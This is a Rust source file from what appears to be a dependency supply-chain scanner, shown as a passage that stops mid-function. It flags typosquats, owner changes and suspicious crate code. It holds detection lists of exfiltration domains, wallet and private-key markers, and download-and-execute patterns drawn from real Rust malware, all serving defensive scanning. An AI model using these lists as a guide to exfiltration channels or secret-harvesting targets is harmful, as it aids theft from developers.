use crate::errors::RustinelError;
use crate::lockfile::{LockfileModel, Package};
use crate::AnalysisOptions;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Evidence {
    pub kind: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    pub summary: String,
}

impl Evidence {
    pub fn new(kind: &str, summary: impl Into<String>) -> Self {
        Self {
            kind: kind.into(),
            path: None,
            summary: summary.into(),
        }
    }

    pub fn with_path(kind: &str, path: impl Into<String>, summary: impl Into<String>) -> Self {
        Self {
            kind: kind.into(),
            path: Some(path.into()),
            summary: summary.into(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskSignal {
    pub id: String,
    pub package: String,
    pub severity: Severity,
    pub weight: u8,
    pub confidence: f32,
    pub evidence: Vec<Evidence>,
    pub recommendation: String,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    pub fn as_str(&self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }
}

/// Collect static, metadata-based risk signals for a lockfile.
///
/// Security invariant: this function only *reads* files. It never executes
/// `build.rs`, never compiles, and never runs dependency code.
pub fn collect_basic_signals(
    lock: &LockfileModel,
    options: &AnalysisOptions,
) -> Result<Vec<RiskSignal>, RustinelError> {
    let mut signals = Vec::new();

    collect_multiple_versions(lock, &mut signals);
    collect_name_heuristics(lock, &mut signals);
    collect_typosquat(lock, options, &mut signals);
    collect_source_substitution(lock, &mut signals);
    collect_freshness(lock, options, &mut signals);
    collect_owners_changed(lock, options, &mut signals);
    collect_yanked(lock, options, &mut signals);
    collect_denied(lock, options, &mut signals);

    if let Some(source_root) = options.source_root() {
        collect_source_signals(lock, &source_root, &mut signals)?;
    }

    apply_known_good_baseline(&mut signals);
    annotate_dependency_paths(lock, &mut signals);
    sort_signals(&mut signals);
    Ok(signals)
}

/// Attach the "why is this here" dependency path to each actionable finding as
/// an extra evidence entry (`kind = "path"`). Purely informational; skipped for
/// Info-level (baseline/declared-license) findings to avoid noise.
fn annotate_dependency_paths(lock: &LockfileModel, signals: &mut [RiskSignal]) {
    let paths = crate::graph::dependency_paths(lock);
    for signal in signals.iter_mut() {
        if signal.severity <= Severity::Info {
            continue;
        }
        let name = signal.package.split('@').next().unwrap_or(&signal.package);
        if let Some(path) = paths.get(name) {
            if path.len() >= 2 {
                signal.evidence.push(Evidence::new(
                    "path",
                    format!("pulled in via: {}", crate::graph::format_path(path)),
                ));
            }
        }
    }
}

/// Emit a signal when a dependency's *current* crates.io owners differ from the
/// trusted baseline (`rustinel-trust.toml`). A newly-added maintainer is the
/// supply-chain takeover vector behind the xz and event-stream attacks — and a
/// database-only scanner is blind to it, because no advisory exists until long
/// after the attack lands.
fn collect_owners_changed(
    lock: &LockfileModel,
    options: &AnalysisOptions,
    signals: &mut Vec<RiskSignal>,
) {
    if options.trusted_owners.is_empty() {
        return;
    }
    let mut done = std::collections::BTreeSet::new();
    for package in lock.registry_packages() {
        // Ownership lives on the crates.io crate; a git / alt-registry package
        // that merely shares a name must not be matched against the baseline.
        if !package.id.is_crates_io() {
            continue;
        }
        let name = package.id.name.as_str();
        // Owners are crate-level; emit at most one signal per crate name. We mark
        // a name "done" only once we have owner metadata for it, so a version
        // that lacks metadata never short-circuits a later version that has it.
        if done.contains(name) {
            continue;
        }
        let Some(trusted) = options.trusted_owners.get(name) else {
            continue;
        };
        let Some(meta) = options.metadata.get(&package.id.to_string()) else {
            continue;
        };
        if meta.owners.is_empty() {
            continue;
        }
        done.insert(name.to_string());
        let current: std::collections::BTreeSet<&str> =
            meta.owners.iter().map(String::as_str).collect();
        let baseline: std::collections::BTreeSet<&str> =
            trusted.iter().map(String::as_str).collect();
        if current == baseline {
            continue;
        }
        let added: Vec<&str> = current.difference(&baseline).copied().collect();
        let removed: Vec<&str> = baseline.difference(&current).copied().collect();
        let mut parts = Vec::new();
        if !added.is_empty() {
            parts.push(format!("new owner(s): {}", added.join(", ")));
        }
        if !removed.is_empty() {
            parts.push(format!("removed owner(s): {}", removed.join(", ")));
        }
        signals.push(RiskSignal {
            id: "owners_changed".into(),
            package: package.id.to_string(),
            severity: Severity::Medium,
            weight: 20,
            confidence: 1.0,
            evidence: vec![Evidence::new(
                "registry",
                format!(
                    "crates.io owners changed since trusted ({}) — a new maintainer is the supply-chain takeover vector (xz, event-stream)",
                    parts.join("; ")
                ),
            )],
            recommendation:
                "Verify the ownership change is legitimate, then refresh the baseline with `cargo rustinel trust`."
                    .into(),
        });
    }
}

/// Flag a *popular* crate name that resolves from a non-crates.io source. A
/// `serde` or `tokio` pulled from a git fork or a private / alternate registry is
/// sometimes an intended patch — but it is also the dependency-confusion /
/// source-substitution vector, where an attacker shadows a trusted name with
/// their own build. cargo-audit, which only matches crates.io packages, is blind
/// to it entirely.
fn collect_source_substitution(lock: &LockfileModel, signals: &mut Vec<RiskSignal>) {
    for package in lock.registry_packages() {
        let name = package.id.name.as_str();
        if !POPULAR_CRATES.contains(&name) {
            continue;
        }
        if package.id.is_crates_io() {
            continue;
        }
        let source = package.id.source.as_deref().unwrap_or("an unknown source");
        signals.push(RiskSignal {
            id: "source_substitution".into(),
            package: package.id.to_string(),
            severity: Severity::Medium,
            weight: 18,
            confidence: 0.7,
            evidence: vec![Evidence::new(
                "source",
                format!(
                    "the popular crate `{name}` resolves from a non-crates.io source ({source}) — \
                     verify this is an intended fork or mirror, not a dependency-confusion substitution"
                ),
            )],
            recommendation:
                "Confirm why a well-known crate name comes from a non-crates.io source. If it is \
                 not an intentional patch, this is the dependency-confusion vector — pin the \
                 crates.io source."
                    .into(),
        });
    }
}

/// Emit `yanked_crate` signals for any locked package the caller flagged as
/// yanked. Yanked status is registry truth (not a heuristic), so it is never
/// suppressed by the known-good baseline.
fn collect_yanked(lock: &LockfileModel, options: &AnalysisOptions, signals: &mut Vec<RiskSignal>) {
    if options.yanked.is_empty() {
        return;
    }
    for package in lock.registry_packages() {
        // Yanked status was fetched from crates.io and keyed by bare name@version;
        // a git/alt-registry crate sharing that id is a different package.
        if !package.id.is_crates_io() {
            continue;
        }
        let id = package.id.to_string();
        if options.yanked.contains(&id) {
            signals.push(RiskSignal {
                id: "yanked_crate".into(),
                package: id,
                severity: Severity::Medium,
                weight: 25,
                confidence: 1.0,
                evidence: vec![Evidence::new(
                    "registry",
                    "this exact version has been yanked from the registry",
                )],
                recommendation: "Update to a non-yanked version, or replace this dependency."
                    .into(),
            });
        }
    }
}

/// Emit a `denied_crate` signal for every locked package whose crate name is on
/// the policy `deny.crates` list. Driven from the dependency set (not from other
/// signals), so an explicit deny is honored even when the crate is otherwise
/// unremarkable — a name-based deny is the operator's strongest control and must
/// never silently no-op. Weight 0: it drives the *decision*, not the score.
fn collect_denied(lock: &LockfileModel, options: &AnalysisOptions, signals: &mut Vec<RiskSignal>) {
    let Some(policy) = &options.policy else {
        return;
    };
    let Some(deny) = &policy.deny else {
        return;
    };
    if deny.crates.is_empty() {
        return;
    }
    for package in lock.registry_packages() {
        if deny.crates.iter().any(|c| c == &package.id.name) {
            signals.push(RiskSignal {
                id: "denied_crate".into(),
                package: package.id.to_string(),
                severity: Severity::High,
                weight: 0,
                confidence: 1.0,
                evidence: vec![Evidence::new(
                    "policy",
                    format!("`{}` is on the policy deny list", package.id.name),
                )],
                recommendation: "Remove this dependency, or remove it from the policy deny list."
                    .into(),
            });
        }
    }
}

/// Stable ordering: severity desc, then signal id, then package — so that JSON
/// and Markdown output is deterministic regardless of discovery order.
pub fn sort_signals(signals: &mut [RiskSignal]) {
    signals.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.id.cmp(&b.id))
            .then_with(|| a.package.cmp(&b.package))
    });
}

fn collect_multiple_versions(lock: &LockfileModel, signals: &mut Vec<RiskSignal>) {
    for (name, packages) in lock.by_name() {
        // Only registry packages can legitimately appear in multiple versions.
        let registry: Vec<&&Package> = packages.iter().filter(|p| !p.id.is_local()).collect();
        if registry.len() > 1 {
            for package in &registry {
                signals.push(RiskSignal {
                    id: "multiple_versions_same_crate".into(),
                    package: package.id.to_string(),
                    severity: Severity::Low,
                    weight: 3,
                    confidence: 1.0,
                    evidence: vec![Evidence::with_path(
                        "lockfile",
                        lock.path.display().to_string(),
                        format!(
                            "{} distinct versions of `{name}` are present",
                            registry.len()
                        ),
                    )],
                    recommendation: "Consider deduplicating dependency versions where feasible."
                        .into(),
                });
            }
        }
    }
}

fn collect_name_heuristics(lock: &LockfileModel, signals: &mut Vec<RiskSignal>) {
    for package in lock.registry_packages() {
        if package.id.name.ends_with("-sys") {
            // Name-only FFI is a weak signal: most `-sys` crates are benign,
            // ubiquitous platform bindings. Start Low; the manifest-confirmed
            // `links` path (in collect_source_signals) escalates to Medium.
            signals.push(RiskSignal {
                id: "native_ffi_detected".into(),
                package: package.id.to_string(),
                severity: Severity::Low,
                weight: 8,
                confidence: 0.6,
                evidence: vec![Evidence::new(
                    "heuristic",
                    "crate name ends with `-sys`, a convention for native/FFI bindings",
                )],
                recommendation:
                    "Review the native dependency and its build process before merging.".into(),
            });
        }
    }
}

/// High-profile crates frequently impersonated by typosquats. A dependency one
/// edit away from one of these (but not itself on the list) is a likely
/// typosquat. Curated, not exhaustive — extend as the ecosystem shifts.
pub const POPULAR_CRATES: &[&str] = &[
    "serde",
    "serde_json",
    "serde_derive",
    "tokio",
    "tokio-util",
    "reqwest",
    "hyper",
    "rand",
    "regex",
    "syn",
    "quote",
    "proc-macro2",
    "libc",
    "log",
    "env_logger",
    "tracing",
    "tracing-subscriber",
    "anyhow",
    "thiserror",
    "clap",
    "futures",
    "bytes",
    "chrono",
    "time",
    "uuid",
    "itertools",
    "rayon",
    "crossbeam",
    "parking_lot",
    "once_cell",
    "lazy_static",
    "base64",
    "hex",
    "sha2",
    "sha1",
    "md5",
    "digest",
    "hmac",
    "aes",
    // Legitimate, widely-used crates that happen to sit one edit away from a
    // popular crate above (`mime`↔`time`, `md-5`↔`md5`, `anes`↔`aes`). Listing
    // them as known-good prevents false-positive typosquat flags on the real
    // crate, while still letting a genuine typosquat *of these* be caught.
    "mime",
    "md-5",
    "anes",
    "rustls",
    "ring",
    "openssl",
    "openssl-sys",
    "native-tls",
    "url",
    "http",
    "h2",
    "mio",
    "socket2",
    "num",
    "num-traits",
    "num-bigint",
    "bitflags",
    "cfg-if",
    "memchr",
    "smallvec",
    "indexmap",
    "hashbrown",
    "ahash",
    "toml",
    "serde_yaml",
    "csv",
    "flate2",
    "zip",
    "tar",
    "walkdir",
    "tempfile",
    "dirs",
    "which",
    "semver",
    "git2",
    "nix",
    "winapi",
    "windows-sys",
    "async-trait",
    "async-std",
    "actix-web",
    "axum",
    "tower",
    "diesel",
    "sqlx",
    "redis",
    "mongodb",
    "prost",
    "tonic",
    "serde_urlencoded",
    "percent-encoding",
    "idna",
    "unicode-normalization",
    "getrandom",
    "rand_core",
    "crc32fast",
    "miniz_oxide",
    "backtrace",
    "addr2line",
    "object",
    "gimli",
    "wasm-bindgen",
    "js-sys",
    "web-sys",
    // Web / async ecosystem
    "tokio-stream",
    "tower-http",
    "tonic-build",
    "tungstenite",
    "tokio-tungstenite",
    "reqwest-middleware",
    "hyper-tls",
    "hyper-util",
    "rustls-pemfile",
    "webpki-roots",
    "trust-dns-resolver",
    "warp",
    "rocket",
    "actix",
    "actix-rt",
    "async-channel",
    "futures-util",
    "futures-core",
    "pin-project",
    "pin-project-lite",
    // Serialization / data
    "bincode",
    "rmp-serde",
    "postcard",
    "serde_with",
    "serde_repr",
    "toml_edit",
    "ron",
    "quick-xml",
    "roxmltree",
    "prost-build",
    "protobuf",
    "arrow",
    "polars",
    // CLI / config / errors
    "clap_derive",
    "clap_complete",
    "structopt",
    "argh",
    "console",
    "indicatif",
    "dialoguer",
    "color-eyre",
    "eyre",
    "miette",
    "config",
    "dotenvy",
    "directories",
    // Crypto / hashing
    "blake3",
    "blake2",
    "sha3",
    "ed25519-dalek",
    "curve25519-dalek",
    "x25519-dalek",
    "rsa",
    "chacha20poly1305",
    "argon2",
    "bcrypt",
    "subtle",
    "zeroize",
    "rand_chacha",
    // Time / numbers / text
    "time-macros",
    "humantime",
    "bigdecimal",
    "rust_decimal",
    "ordered-float",
    "unicode-width",
    "unicode-segmentation",
    "aho-corasick",
    "regex-syntax",
    "fancy-regex",
    "nom",
    "pest",
    "logos",
    // Async runtimes / utils
    "async-stream",
    "dashmap",
    "flume",
    "arc-swap",
    "thread_local",
    "num_cpus",
    "rayon-core",
    "crossbeam-channel",
    "crossbeam-utils",
    // DB / storage
    "sea-orm",
    "rusqlite",
    "deadpool",
    "r2d2",
    "sled",
    "rocksdb",
    // Testing / macros
    "proptest",
    "quickcheck",
    "mockall",
    "insta",
    "criterion",
    "trybuild",
    "paste",
    "strum",
    "derive_more",
    "darling",
];

/// Flag dependencies whose name is exactly one edit away from a popular crate
/// (Damerau-Levenshtein distance 1) — a likely typosquat / impersonation. The
/// dependency itself must not be on the popular list.
/// Download count at or above which a crate is considered established enough
/// that a name collision with a popular crate is almost certainly coincidental
/// (e.g. `miow` vs `mio`) rather than a typosquat. Below it, the collision is
/// suspicious. Corroborating with adoption is what turns a noisy edit-distance
/// heuristic into a precise signal.
const TYPOSQUAT_TRUST_DOWNLOADS: u64 = 10_000;

fn collect_typosquat(
    lock: &LockfileModel,
    options: &AnalysisOptions,
    signals: &mut Vec<RiskSignal>,
) {
    for package in lock.registry_packages() {
        let name = package.id.name.as_str();
        if POPULAR_CRATES.contains(&name) || is_known_good(name) {
            continue;
        }
        // Skip very short names — distance-1 collisions are meaningless there.
        if name.len() < 4 {
            continue;
        }
        let Some(target) = nearest_popular(name) else {
            continue;
        };
        // Corroborate against registry adoption. A name one edit from a popular
        // crate is only suspicious when the crate is *also* obscure; an
        // established crate that merely looks similar (e.g. `miow`) is not a
        // typosquat. Without metadata we cannot tell, so we emit a quiet hint
        // rather than a misleading Medium finding.
        let downloads = options
            .metadata
            .get(&package.id.to_string())
            .and_then(|m| m.total_downloads);
        let base =
            format!("crate name `{name}` is one edit away from the popular crate `{target}`");
        let signal = match downloads {
            // Established crate that merely looks similar — not a typosquat.
            Some(d) if d >= TYPOSQUAT_TRUST_DOWNLOADS => continue,
            // Name-similar AND obscure — a strong typosquat suspect.
            Some(d) => RiskSignal {
                id: "possible_typosquat".into(),
                package: package.id.to_string(),
                severity: Severity::Medium,
                weight: 18,
                confidence: 0.85,
                evidence: vec![Evidence::new(
                    "heuristic",
                    format!("{base}, and has only {d} downloads — likely typosquat / impersonation"),
                )],
                recommendation:
                    "Verify the publisher and source; this is very likely not the crate you intended."
                        .into(),
            },
            // No registry metadata to corroborate (offline / --online-metadata off).
            None => RiskSignal {
                id: "possible_typosquat".into(),
                package: package.id.to_string(),
                severity: Severity::Info,
                weight: 0,
                confidence: 0.3,
                evidence: vec![Evidence::new(
                    "heuristic",
                    format!("{base} — trust unverified offline (re-run with --online-metadata)"),
                )],
                recommendation:
                    "Run with --online-metadata to corroborate against download counts before acting."
                        .into(),
            },
        };
        signals.push(signal);
    }
}

/// Versions published within this many days are flagged as freshly published —
/// the window in which a supply-chain attack lives before anyone, including the
/// advisory databases, has reviewed it.
const FRESH_DAYS: u64 = 14;

/// Emit a signal for any crates.io dependency whose *locked version* was
/// published very recently. "New == unreviewed" — this is the proactive,
/// pre-advisory signal that a database-only scanner (cargo-audit) cannot
/// produce, because it exists before any advisory is ever filed.
fn collect_freshness(
    lock: &LockfileModel,
    options: &AnalysisOptions,
    signals: &mut Vec<RiskSignal>,
) {
    for package in lock.registry_packages() {
        // Only crates.io packages have crates.io publish dates; a git / alt-registry
        // package sharing a name@version must not borrow injected metadata.
        if !package.id.is_crates_io() {
            continue;
        }
        let Some(meta) = options.metadata.get(&package.id.to_string()) else {
            continue;
        };
        let Some(days) = meta.published_days_ago else {
            continue;
        };
        if days > FRESH_DAYS {
            continue;
        }
        signals.push(RiskSignal {
            id: "freshly_published".into(),
            package: package.id.to_string(),
            severity: Severity::Low,
            weight: 6,
            confidence: 1.0,
            evidence: vec![Evidence::new(
                "registry",
                format!(
                    "version published {days} day(s) ago — recently published code has had little time for review or for advisories to surface"
                ),
            )],
            recommendation:
                "Confirm this version bump is intended; freshly published versions are the window for supply-chain attacks."
                    .into(),
        });
    }
}

/// Public selector: the popular crate this name is a possible typosquat of
/// (Damerau-Levenshtein distance 1), if it is a candidate worth corroborating.
///
/// The CLI uses this to fetch registry metadata only for the handful of typosquat
/// candidates in a lockfile, instead of querying every dependency — keeping the
/// online lookup cheap and polite to crates.io.
pub fn typosquat_target(name: &str) -> Option<&'static str> {
    if POPULAR_CRATES.contains(&name) || is_known_good(name) || name.len() < 4 {
        return None;
    }
    nearest_popular(name)
}

/// The first popular crate at Damerau-Levenshtein distance exactly 1, if any.
fn nearest_popular(name: &str) -> Option<&'static str> {
    POPULAR_CRATES
        .iter()
        .copied()
        .find(|p| *p != name && damerau_levenshtein(name, p) == 1)
}

/// Damerau-Levenshtein edit distance (insert/delete/substitute/transpose).
/// Operates on bytes — crate names are ASCII.
pub(crate) fn damerau_levenshtein(a: &str, b: &str) -> usize {
    let a = a.as_bytes();
    let b = b.as_bytes();
    let (n, m) = (a.len(), b.len());
    if n == 0 {
        return m;
    }
    if m == 0 {
        return n;
    }
    let mut prev2: Vec<usize> = vec![0; m + 1];
    let mut prev: Vec<usize> = (0..=m).collect();
    let mut curr: Vec<usize> = vec![0; m + 1];
    for i in 1..=n {
        curr[0] = i;
        for j in 1..=m {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            let mut val = (prev[j] + 1).min(curr[j - 1] + 1).min(prev[j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                val = val.min(prev2[j - 2] + 1); // transposition
            }
            curr[j] = val;
        }
        std::mem::swap(&mut prev2, &mut prev);
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[m]
}

/// Markers of anomalous build-script *intent*, scanned statically (never run).
///
/// Network access and opaque embedded payloads in a `build.rs` are strong red
/// flags — a build script should compile, not phone home or unpack a blob. We
/// deliberately do NOT flag process execution alone, because legitimate
/// native-build crates (`cc`, `cmake`, `pkg-config`) spawn the C toolchain.
const BUILD_RS_NETWORK: &[&str] = &[
    "reqwest",
    "ureq",
    "hyper",
    "isahc",
    "curl",
    "TcpStream",
    "std::net",
    "minreq",
    "attohttpc",
    "tokio::net",
];
const BUILD_RS_PAYLOAD: &[&str] = &[
    "include_bytes!",
    "base64::decode",
    "STANDARD.decode",
    "from_base64",
    "hex::decode",
    "libloading",
    "dlopen",
];

/// Markers that a runtime source file *harvests secrets*: crypto-wallet / key
/// vocabulary. Individually noisy, but decisive in conjunction with scanning the
/// user's own source files (`SOURCE_SCAN`) — the faster_log / async_println
/// malware fingerprint (Sept 2025).
const SECRET_MARKERS: &[&str] = &[
    "base58",
    "Base58",
    "private_key",
    "private key",
    "PRIVATE KEY",
    "keypair",
    "secp256k1",
    "mnemonic",
    "seed phrase",
    "solana",
    "Solana",
    "ethereum",
    "Ethereum",
    "wallet",
    // Key-format literals — catch harvesting even when the keyword vocabulary is
    // obfuscated: the base58 alphabet (Solana / BTC secrets) and an Ethereum
    // private-key regex (`0x` + 64 hex). Decisive substrings; rare in non-crypto code.
    "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijk",
    "[0-9a-fA-F]{64}",
];
/// Markers that code walks/reads the *consuming project's* `.rs` source — almost
/// never legitimate for a runtime library.
const SOURCE_SCAN: &[&str] = &[
    "read_dir",
    "WalkDir",
    "walkdir",
    "read_to_string",
    "fs::read",
];

/// Domain classes that almost never appear in a legitimate library's *runtime*
/// source but are common data-exfiltration channels. Cloudflare Workers
/// (`*.workers.dev`) is where the faster_log crypto-stealer (Sept 2025) sent the
/// keys it harvested; Telegram, IP-geolocation, paste and webhook services are
/// the usual drop endpoints. Matched as substrings, scanned statically, never
/// executed.
/// Pure data-exfiltration endpoints: there is no legitimate reason for a normal
/// crate to hard-code one, so a match alone is suspicious. (CF Workers, paste
/// sites, anonymous file hosts, request-capture services, tunnels.)
const EXFIL_HOST_DOMAINS: &[&str] = &[
    ".workers.dev",
    "pastebin.com",
    "paste.ee",
    "transfer.sh",
    "0x0.st",
    "anonfiles.com",
    "webhook.site",
    "requestbin",
    "pipedream.net",
    ".ngrok.io",
    ".ngrok-free.app",
];

/// Dual-use service APIs that malware abuses for exfil but that purpose-built
/// crates use legitimately (a `*-telegram` gateway hitting `api.telegram.org`, a
/// geo-IP crate hitting `ip-api.com`). A match here is only suspicious when the
/// SAME file also handles wallet/secret material — i.e. the exfil shape — so a
/// legitimate integration crate is not flagged just for talking to its service.
const DUAL_USE_EXFIL_DOMAINS: &[&str] = &[
    "api.telegram.org",
    "ip-api.com",
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks",
];

/// True when a download-and-execute sequence is *causally tight*: an env-var
/// gate, a network call, and a process spawn all fall within a small line window
/// (one block/function) — the rustdecimal shape, where `Decimal::new` checked an
/// env var, fetched a payload, and ran it within a few lines. A large CLI that
/// scatters unrelated env-config reads, an HTTP client, and a `Command` spawn
/// across thousands of lines does NOT match — that whole-file co-presence was a
/// false positive (e.g. a tool that reads config from env, calls an RPC, and
/// shells out to `cargo`, none of which are related).
fn env_gated_block(content: &str) -> bool {
    const WINDOW: usize = 25;
    const ENV: &[&str] = &["env::var", "var_os"];
    const SPAWN: &[&str] = &["Command::new", "process::Command", "libc::system"];
    let lines: Vec<&str> = content.lines().collect();
    for (i, line) in lines.iter().enumerate() {
        if !BUILD_RS_NETWORK.iter().any(|m| line.contains(m)) {
            continue;
        }
        let lo = i.saturating_sub(WINDOW);
        let hi = (i + WINDOW + 1).min(lines.len());
        let window = &lines[lo..hi];
        let gated = window.iter().any(|l| ENV.iter().any(|m| l.contains(m)));
        let spawns = window.iter().any(|l| SPAWN.iter().any(|m| l.contains(m)));
        if gated && spawns {
            return true;
        }
    }
    false
}

#[derive(Default)]
struct ExfilScan {
    exfil_domain: Option<String>,
    /// First file matching each fingerprint, so every emitted signal cites the
    /// file it actually applies to (rather than one shared, possibly-wrong path).
    domain_sample: Option<PathBuf>,
    env_gated_sample: Option<PathBuf>,
    /// The source-exfil conjunction must hold *within one file* (a single file both
    /// reads the project's `.rs` files AND reaches the network or handles secrets),
    /// not across the crate — otherwise a codegen helper reading `.rs` in one module
    /// plus an HTTP client in an unrelated module would falsely fire the High signal.
    source_exfil_sample: Option<PathBuf>,
    source_exfil_network: bool,
    source_exfil_secrets: bool,
}

impl ExfilScan {
    fn any_match(&self) -> bool {
        self.source_exfil_sample.is_some()
            || self.domain_sample.is_some()
            || self.env_gated_sample.is_some()
    }
}

/// Read a directory's entries **sorted by file name**, so any walk built on it
/// is reproducible across filesystems (ext4 hash order, APFS, and tmpfs each
/// return `read_dir` in a different native order). Every emitted evidence path
/// that is selected from a directory walk — the `unsafe` sample, the
/// source-exfil / domain / env-gated samples — depends on this for the
/// `--no-timestamp` byte-identical-output invariant to hold across machines,
/// not just across runs on one filesystem. A failed `read_dir` yields no
/// entries (the caller treats that the same as an empty directory).
fn sorted_dir_entries(dir: &Path) -> Vec<std::fs::DirEntry> {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    // Bound the materialized set: a single hostile directory holding millions of
    // entries must not be collected in full before the caller's per-entry
    // MAX_DIR_ENTRIES cap applies. Taking one more than the whole-walk cap is
    // always enough (the walk stops at MAX_DIR_ENTRIES total anyway), so for any
    // real crate (far fewer files) every entry is still collected and the sort is
    // fully deterministic; only a pathological directory is truncated, where
    // reproducibility is moot.
    let mut entries: Vec<_> = rd
        .flatten()
        .take(crate::safety::MAX_DIR_ENTRIES.saturating_add(1))
        .collect();
    entries.sort_by_key(|e| e.file_name());
    entries
}

/// Scan a crate's `src` tree (read-only, bounded, symlink-safe) for the runtime
/// secret-exfiltration fingerprint.
fn scan_source_exfil(crate_dir: &Path) -> Option<ExfilScan> {
    use crate::safety::{MAX_DIR_DEPTH, MAX_DIR_ENTRIES, MAX_SOURCE_FILE_BYTES};
    let mut found = ExfilScan::default();
    let mut stack: Vec<(PathBuf, usize)> = if crate_dir.join("src").is_dir() {
        vec![(crate_dir.join("src"), 0)]
    } else {
        vec![(crate_dir.to_path_buf(), 0)]
    };
    let mut visited = 0usize;
    'walk: while let Some((dir, depth)) = stack.pop() {
        for entry in sorted_dir_entries(&dir) {
            if visited >= MAX_DIR_ENTRIES {
                // Terminate the whole walk at the cap (not just this dir), matching
                // count_unsafe — avoids a wasted read_dir per remaining stacked dir.
                break 'walk;
            }
            visited += 1;
            let Ok(ft) = entry.file_type() else { continue };
            if ft.is_symlink() {
                continue;
            }
            let path = entry.path();
            if ft.is_dir() {
                if depth < MAX_DIR_DEPTH {
                    stack.push((path, depth + 1));
                }
                continue;
            }
            if ft.is_file() && path.extension().and_then(|e| e.to_str()) == Some("rs") {
                if let Some(c) = crate::safety::read_file_capped(&path, MAX_SOURCE_FILE_BYTES) {
                    let scans = c.contains("\".rs\"") && SOURCE_SCAN.iter().any(|m| c.contains(m));
                    let net = BUILD_RS_NETWORK.iter().any(|m| c.contains(m));
                    let sec = SECRET_MARKERS.iter().any(|m| c.contains(m));
                    // A pure exfil host is suspicious on its own; a dual-use service
                    // API only when the same file also handles secret material.
                    let domain_here =
                        EXFIL_HOST_DOMAINS
                            .iter()
                            .find(|d| c.contains(**d))
                            .or_else(|| {
                                sec.then(|| DUAL_USE_EXFIL_DOMAINS.iter().find(|d| c.contains(**d)))
                                    .flatten()
                            });
                    // Env-gated remote payload (rustdecimal, 2022): the env-var gate,
                    // the network fetch, and the process spawn must be causally tight
                    // (one block/function), not merely co-present somewhere in a large
                    // file — see `env_gated_block`.
                    let env_gated = env_gated_block(&c);
                    // faster_log/async_println conjunction must hold in ONE file:
                    // a file that both reads the project's `.rs` files and reaches
                    // the network or handles secrets. (Crate-wide OR would falsely
                    // fire on a codegen helper + an unrelated HTTP client.)
                    if scans && (net || sec) && found.source_exfil_sample.is_none() {
                        found.source_exfil_sample = Some(path.clone());
                        found.source_exfil_network = net;
                        found.source_exfil_secrets = sec;
                    }
                    if let Some(d) = domain_here {
                        if found.exfil_domain.is_none() {
                            found.exfil_domain = Some((*d).to_string());
                        }
                        if found.domain_sample.is_none() {
                            found.domain_sample = Some(path.clone());
                        }
                    }
                    if env_gated && found.env_gated_sample.is_none() {
                        found.env_gated_sample = Some(path.clone());
                    }
                }
            }
        }
    }
    found.any_match().then_some(found)
}

/// Build the `suspicious_source_exfil` signal if a crate's runtime source both
/// scans the project's `.rs` files AND either exfiltrates over the network or
/// references secret/wallet material — the live crypto-stealer crate pattern.
fn source_exfil_signal(package: &str, network: bool, secrets: bool, path: String) -> RiskSignal {
    let mut what = Vec::new();
    if network {
        what.push("exfiltrates over the network");
    }
    if secrets {
        what.push("references wallet/private-key material");
    }
    RiskSignal {
        id: "suspicious_source_exfil".into(),
        package: package.to_string(),
        severity: Severity::High,
        weight: 26,
        confidence: 0.6,
        evidence: vec![
            Evidence::with_path(
                "source",
                path,
                "runtime source scans the project's `.rs` files (scanned statically, never executed)",
            ),
            Evidence::new(
                "heuristic",
                format!("…and {} — matches the faster_log/async_println crypto-stealer pattern", what.join(" and ")),
            ),
        ],
        recommendation:
            "A dependency that reads your source files and exfiltrates/handles secrets is almost \
             certainly malicious. Do not build it; report it to the registry."
                .into(),
    }
}

/// Build a `suspicious_exfil_domain` signal when a crate's runtime source
/// hard-codes a domain from a known data-exfiltration class. Unlike
/// `suspicious_source_exfil` this does **not** require the crate to read the
/// project's `.rs` files — the faster_log stealer harvested keys from *log*
/// files and shipped them to a `*.workers.dev` endpoint, which the source-scan
/// fingerprint alone would miss.
fn exfil_domain_signal(package: &str, domain: &str, path: String) -> RiskSignal {
    RiskSignal {
        id: "suspicious_exfil_domain".into(),
        package: package.to_string(),
        severity: Severity::Medium,
        weight: 18,
        confidence: 0.5,
        evidence: vec![Evidence::with_path(
            "source",
            path,
            format!(
                "runtime source references `{domain}`, a domain class commonly used for data exfiltration (scanned statically, never executed)"
            ),
        )],
        recommendation:
            "Confirm why this dependency contacts that endpoint. Cloudflare Workers, Telegram, \
             IP-geolocation and paste/webhook services are common exfiltration channels — the \
             faster_log crypto-stealer (Sept 2025) shipped harvested keys to a `*.workers.dev` URL."
                .into(),
    }
}

/// Build an `env_gated_payload` signal: a runtime file that reads an environment
/// variable, fetches over the network, and spawns a process — the rustdecimal
/// (2022) fingerprint, where the malicious `Decimal::new` checked `GITLAB_CI`,
/// downloaded a binary, and executed it. Read statically, never run.
fn env_gated_payload_signal(package: &str, path: String) -> RiskSignal {
    RiskSignal {
        id: "env_gated_payload".into(),
        package: package.to_string(),
        severity: Severity::High,
        weight: 24,
        confidence: 0.5,
        evidence: vec![Evidence::with_path(
            "source",
            path,
            "runtime source reads an environment variable, makes a network request, and spawns a \
             process — the env-gated remote-payload pattern (scanned statically, never executed)",
        )],
        recommendation:
            "A dependency that gates a download-and-execute on an environment variable (e.g. a CI \
             flag) is the rustdecimal supply-chain pattern. Review this code before building; \
             report it if it is not yours."
                .into(),
    }
}

/// Build an optional `build_script_suspicious` signal from a build.rs body.
pub(crate) fn build_script_intent_signal(
    package: &str,
    content: &str,
    path: String,
) -> Option<RiskSignal> {
    let net: Vec<&str> = BUILD_RS_NETWORK
